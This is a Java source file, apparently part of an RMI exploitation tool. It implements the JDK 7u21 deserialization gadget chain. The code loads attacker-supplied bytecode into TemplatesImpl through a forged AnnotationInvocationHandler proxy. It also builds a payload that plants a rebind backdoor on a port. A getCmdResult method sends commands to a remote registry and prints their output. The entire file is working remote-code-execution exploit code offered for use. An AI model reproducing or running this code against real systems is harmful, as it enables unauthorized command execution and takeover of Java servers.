package payload;

import com.sun.security.auth.UnixPrincipal;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;
import util.Reflections;
import util.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.remote.rmi.RMIConnection;
import javax.security.auth.Subject;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.util.*;

public class Jdk7u21 extends RemoteObject implements PayloadType {

    private static final Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};
    public static Boolean flag = false;

    @Override
    public HashSet getObject(String command, Boolean flag, String... args) throws Exception {
        byte[] classBytes = Utils.getPayloadByte(command, flag, args);
        return getHashSet(classBytes);

    }


    public HashSet getRebindObject(String port) throws Exception {
        byte[] classBytes = Utils.getRebindPayloadByte(port);
        return getHashSet(classBytes);
    }


    public static HashSet getHashSet(byte[] classBytes) throws Exception {
        TemplatesImpl impl = new TemplatesImpl();
        Reflections.setFieldValue(impl, "_bytecodes", new byte[][]{classBytes});
        Reflections.setFieldValue(impl, "_name", "testTemplatesImpl");
        Reflections.setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());

        HashMap map = new HashMap();
        map.put("f5a5a608", "foo");

        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);

        Templates proxy = (Templates) Proxy.newProxyInstance(Jdk7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        HashSet hashSet = new LinkedHashSet();
        hashSet.add(impl);
        hashSet.add(proxy);

        map.put("f5a5a608", impl);
        return hashSet;
    }

    public static void getCmdResult(String ip, int port, String cmd) throws Exception {

        Registry registry = LocateRegistry.getRegistry(ip, port);
        Subject subject = new Subject();

        Set set = new HashSet();
        UnixPrincipal unixPrincipal = new UnixPrincipal(cmd);
        set.add(unixPrincipal);

        Reflections.setFieldValue(subject, "principals", set);

        RemoteRef ref = (RemoteRef) Reflections.getFieldValue(registry, "ref");

        String result = ((RMIConnection) lookup(Utils.randomRebindName, ref, ip)).getDefaultDomain(subject);
        if (result.length() > 0) {
            System.out.println(result);
        } else {
            System.out.println("未获取到结果");
        }


    }

    private static Remote lookup(String var1, RemoteRef ref, String ip) throws AccessException, NotBoundException, RemoteException {
        try {
            StreamRemoteCall var2 = (StreamRemoteCall) ref.newCall(new Jdk7u21(), operations, 2, 4905912898345647071L);

            try {
                ObjectOutput var3 = var2.getOutputStream();
                var3.writeObject(var1);
            } catch (IOException var15) {
                throw new MarshalException("error marshalling arguments", var15);
            }

            ref.invoke(var2);

            Remote var20;
            try {
                ObjectInput var4 = var2.getInputStream();
                var20 = (Remote) var4.readObject();

                Object conn = Reflections.getFieldValue(var2, "in");

                HashMap rets = (HashMap) Reflections.getFieldValue(conn, "incomingRefTable");

                Map.Entry<TCPEndpoint, ArrayList> entry = (Map.Entry<TCPEndpoint, ArrayList>) rets.entrySet().iterator().next();

                Reflections.setFieldValue(entry.getKey(), "host", ip);
            } catch (IOException | ClassNotFoundException | ClassCastException var13) {

                throw new UnmarshalException("error unmarshalling return", var13);
            } finally {
                ref.done(var2);
            }

            return var20;
        } catch (RuntimeException var16) {
            throw var16;
        } catch (RemoteException var17) {
            throw var17;
        } catch (NotBoundException var18) {
            throw var18;
        } catch (Exception var19) {
            throw new UnexpectedException("undeclared checked exception", var19);
        }
    }
}
